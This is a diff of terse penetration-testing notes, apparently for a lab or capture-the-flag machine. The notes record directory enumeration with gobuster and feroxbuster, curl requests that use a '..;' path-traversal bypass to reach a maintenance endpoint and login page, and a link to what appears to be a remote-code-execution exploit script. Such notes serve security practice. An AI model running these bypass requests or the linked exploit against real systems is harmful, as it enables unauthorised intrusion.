@@ -24,10 +24,14 @@ Launch http://10.129.10.10:8000/
 gobuster dir -q -u http://10.129.10.10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 ==========(4)======================================================================================================================
 feroxbuster -u http://10.129.10.10 -x php,asp,aspx
+feroxbuster -u 'http://10.129.10.10/maintenance/..;' -x jsp
+
+/* or
 curl -I "http://10.129.10.10/maintenance/"
 curl -v "http://10.129.10.10/maintenance/..;"
 curl -v "http://10.129.10.10/maintenance/..;/nxstartup.faces"
 http://10.129.96.116/maintenance/..;/login.jsp
+*/
 ==========(5)======================================================================================================================
 https://raw.githubusercontent.com/ajiththomas/python/refs/heads/main/nexusRCE2.py
 ==========(6)======================================================================================================================
